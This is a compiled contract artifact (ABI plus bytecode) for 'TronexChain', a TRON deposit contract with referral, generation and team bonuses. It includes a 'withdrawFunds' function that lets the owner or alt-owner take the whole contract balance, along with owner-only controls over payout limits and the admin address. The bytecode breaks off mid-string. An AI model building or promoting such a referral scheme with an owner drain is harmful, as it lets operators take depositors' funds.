{
  "contractName": "TronexChain",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "PERCENT_DIVIDER",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "TIME_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "BASE_PERCENT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "CONTRACT_BALANCE_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_withdraw",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "max_receivable",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "users",
      "outputs": [
        {
          "name": "cycle",
          "type": "uint256"
        },
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "cycles",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "alt_owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "team_levels",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_deposited",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "MIN_DEPOSIT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_users",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_alt_owner",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "upline",
          "type": "address"
        }
      ],
      "name": "Upline",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "DirectPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "MatchPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LimitReached",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_upline",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "maxPayoutOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "name": "payout",
          "type": "uint256"
        },
        {
          "name": "max_payout",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_maxRecPercent",
          "type": "uint256"
        }
      ],
      "name": "changeMaxRec",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newAdmin",
          "type": "address"
        }
      ],
      "name": "changeAdmin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfo",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfoTotals",
      "outputs": [
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "name": "_total_users",
          "type": "uint256"
        },
        {
          "name": "_total_deposited",
          "type": "uint256"
        },
        {
          "name": "_total_withdraw",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600255601e60035560016007553480156200002057600080fd5b50d380156200002e57600080fd5b50d280156200003c57600080fd5b5060405160408062003956833981018060405260408110156200005e57600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506006601e908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550506006600a908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060066005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600564174876e800908060018154018082558091505090600182039060005260206000200160009091929091909150555060056445d964b8009080600181540180825580915050906001820390600052602060002001600090919290919091505550600564d18c2e2800908060018154018082558091505090600182039060005260206000200160009091929091909150555060056501d1a94a2000908060018154018082558091505090600182039060005260206000200160009091929091909150555050506134f480620004626000396000f3fe60806040526004361061019e576000357c0100000000000000000000000000000000000000000000000000000000900480638da5cb5b116100ee578063b741c62a116100a7578063de560cca11610081578063de560cca14610a6d578063e1e158a514610ab2578063e7cc62bd14610af7578063f340fa0114610b3c5761019e565b8063b741c62a14610948578063b7d9f0d2146109b9578063bf6e196414610a285761019e565b80638da5cb5b1461066c5780638f283970146106dd5780639a8318f4146107485780639acb6b2d1461078d578063a87430ba146107d2578063afbce3b9146108df5761019e565b80635988859f1161015b5780636da61d1e116101355780636da61d1e1461049d5780636f9fb98a1461052357806374b95b2d146105685780638959af3c146106035761019e565b80635988859f146103be57806362f3765e146104135780636aabddee146104585761019e565b806315c43aaf146101a35780631959a002146101f657806324600fc3146102d257806329fc7bd81461030357806332bc298c146103485780633ccfd60b1461038d575b600080fd5b3480156101af57600080fd5b50d380156101bc57600080fd5b50d280156101c957600080fd5b506101d2610b80565b60405180848152602001838152602001828152602001935050505060405180910390f35b34801561020257600080fd5b50d3801561020f57600080fd5b50d2801561021c57600080fd5b5061025f6004803603602081101561023357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610b99565b604051808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018664ffffffffff1664ffffffffff168152602001858152602001848152602001838152602001828152602001965050505050505060405180910390f35b3480156102de57600080fd5b50d380156102eb57600080fd5b50d280156102f857600080fd5b50610301610d7a565b005b34801561030f57600080fd5b50d3801561031c57600080fd5b50d2801561032957600080fd5b50610332610f17565b6040518082815260200191505060405180910390f35b34801561035457600080fd5b50d3801561036157600080fd5b50d2801561036e57600080fd5b50610377610f1d565b6040518082815260200191505060405180910390f35b34801561039957600080fd5b50d380156103a657600080fd5b50d280156103b357600080fd5b506103bc610f22565b005b3480156103ca57600080fd5b50d380156103d757600080fd5b50d280156103e457600080fd5b50610411600480360360208110156103fb57600080fd5b8101908080359060200190929190505050611888565b005b34801561041f57600080fd5b50d3801561042c57600080fd5b50d2801561043957600080fd5b506104426119ae565b6040518082815260200191505060405180910390f35b34801561046457600080fd5b50d3801561047157600080fd5b50d2801561047e57600080fd5b506104876119b3565b6040518082815260200191505060405180910390f35b3480156104a957600080fd5b50d380156104b657600080fd5b50d280156104c357600080fd5b50610506600480360360208110156104da57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506119ba565b604051808381526020018281526020019250505060405180910390f35b34801561052f57600080fd5b50d3801561053c57600080fd5b50d2801561054957600080fd5b50610552611c9c565b6040518082815260200191505060405180910390f35b34801561057457600080fd5b50d3801561058157600080fd5b50d2801561058e57600080fd5b506105d1600480360360208110156105a557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611cbb565b604051808681526020018581526020018481526020018381526020018281526020019550505050505060405180910390f35b34801561060f57600080fd5b50d3801561061c57600080fd5b50d2801561062957600080fd5b506106566004803603602081101561064057600080fd5b8101908080359060200190929190505050611e25565b6040518082815260200191505060405180910390f35b34801561067857600080fd5b50d3801561068557600080fd5b50d2801561069257600080fd5b5061069b611e62565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156106e957600080fd5b50d380156106f657600080fd5b50d2801561070357600080fd5b506107466004803603602081101561071a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611e87565b005b34801561075457600080fd5b50d3801561076157600080fd5b50d2801561076e57600080fd5b50610777611fe6565b6040518082815260200191505060405180910390f35b34801561079957600080fd5b50d380156107a657600080fd5b50d280156107b357600080fd5b506107bc611fec565b6040518082815260200191505060405180910390f35b3480156107de57600080fd5b50d380156107eb57600080fd5b50d280156107f857600080fd5b5061083b6004803603602081101561080f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611ff2565b604051808e81526020018d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018c81526020018b81526020018a81526020018981526020018881526020018781526020018664ffffffffff1664ffffffffff1681526020018581526020018481526020018381526020018281526020019d505050505050505050505050505060405180910390f35b3480156108eb57600080fd5b50d380156108f857600080fd5b50d2801561090557600080fd5b506109326004803603602081101561091c57600080fd5b8101908080359060200190929190505050612089565b6040518082815260200191505060405180910390f35b34801561095457600080fd5b50d3801561096157600080fd5b50d2801561096e57600080fd5b506109776120ac565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156109c557600080fd5b50d380156109d257600080fd5b50d280156109df57600080fd5b50610a0c600480360360208110156109f657600080fd5b81019080803590602001909291905050506120d2565b604051808260ff1660ff16815260200191505060405180910390f35b348015610a3457600080fd5b50d38015610a4157600080fd5b50d28015610a4e57600080fd5b50610a57612105565b6040518082815260200191505060405180910390f35b348015610a7957600080fd5b50d38015610a8657600080fd5b50d28015610a9357600080fd5b50610a9c61210b565b6040518082815260200191505060405180910390f35b348015610abe57600080fd5b50d38015610acb57600080fd5b50d28015610ad857600080fd5b50610ae1612111565b6040518082815260200191505060405180910390f35b348015610b0357600080fd5b50d38015610b1057600080fd5b50d28015610b1d57600080fd5b50610b26612119565b6040518082815260200191505060405180910390f35b610b7e60048036036020811015610b5257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061211f565b005b6000806000600754600854600954925092509250909192565b600080600080600080600460008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600460008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff16600460008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154600460008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154600460008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015495509550955095509550955091939550919395565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480610e225750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515610e96576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610f14573d6000803e3d6000fd5b50565b61271081565b60b481565b6000803073ffffffffffffffffffffffffffffffffffffffff16636da61d1e336040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b158015610fbd57600080fd5b505afa158015610fd1573d6000803e3d6000fd5b505050506040513d6040811015610fe757600080fd5b8101908080519060200190929190805190602001909291905050509150915080600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301541015156110bf576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600c8152602001807f46756c6c207061796f757473000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000821115611207578082600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015401111561115c57600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154810391505b81600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007016000828254019250508190555081600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055506112063383612136565b5b80600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015410801561129a57506000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15611421576000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015401111561137a57600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154820390505b80600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004016000828254039250508190555080600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508083019250505b80600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301541080156114b457506000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154115b1561163b576000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015490508181600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015401111561159457600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154820390505b80600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005016000828254039250508190555080600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508083019250505b6000821115156116b3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f5a65726f207061796f757400000000000000000000000000000000000000000081525060200191505060405180910390fd5b81600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0160008282540192505081905550816009600082825401925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015611759573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364836040518082815260200191505060405180910390a280600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154101515611884573373ffffffffffffffffffffffffffffffffffffffff167f97ddeb77c85e6a1dd99a34fe2bb1a4f9b211d5ffced7a707de9dbeb24363d0e4600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301546040518082815260200191505060405180910390a25b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806119305750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b15156119a4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b8060028190555050565b607881565b6298968081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b158015611a6c57600080fd5b505afa158015611a80573d6000803e3d6000fd5b505050506040513d6020811015611a9657600080fd5b810190808051906020019092919050505090506000611ab36123b4565b905081600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600701541015611c9657600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015461271060b4600460008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff164203811515611bad57fe5b0483600460008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601540202811515611bfd57fe5b040392508183600460008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154011115611c9557600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154820392505b5b50915091565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000806000806000600460008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154600460008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090154600460008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0154600460008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0154600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c01549450945094509450945091939590929450565b6000806002541115611e495760646002548302811515611e4157fe5b049050611e5d565b606461015e8302811515611e5957fe5b0490505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480611f2f5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515611fa3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60095481565b60025481565b60046020528060005260406000206000915090508060000154908060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060020154908060030154908060040154908060050154908060060154908060070154908060080160009054906101000a900464ffffffffff169080600901549080600a01549080600b01549080600c015490508d565b60058181548110151561209857fe5b906000526020600020016000915090505481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6006818154811015156120e157fe5b9060005260206000209060209182820401919006915054906101000a900460ff1681565b60035481565b60085481565b6302faf08081565b60075481565b612129338261242f565b612133333461286d565b50565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6006805490508160ff1610156123ae57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156121ed576123ae565b6001810160ff16600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015410151561233c576000606460068360ff1681548110151561225457fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff16850281151561228257fe5b04905080600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501600082825401925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f16e746f9be6c4b545700b04df27afb9fceabf59b94ef1c816e78a435059fabea836040518082815260200191505060405180910390a3505b600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915080806001019150506121a3565b50505050565b6000803073ffffffffffffffffffffffffffffffffffffffff1631905060008090506000809050600062989680848115156123eb57fe5b049050603281111515612404578092506000915061241a565b603292508260028281151561241557fe5b040391505b60008284019050806078019550505050505090565b600073ffffffffffffffffffffffffffffffffffffffff16600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161480156124f957508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b801561255257506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b801561260f57506000600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff16118061260e57506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b5b156128695780600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600081548092919060010191905055508073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167f9f4d150e5193cfa9a87226111d3b60b624d97ccc056eeeac1569af1ea27bf64160405160405180910390a360076000815480929190600101919050555060008090505b6006805490508160ff16101561286757600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156127a357612867565b600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0160008154809291906001019190505550600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050612759565b505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614158061295757506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b15156129cb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260098152602001807f4e6f2075706c696e65000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff161115612da957600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000016000815480929190600101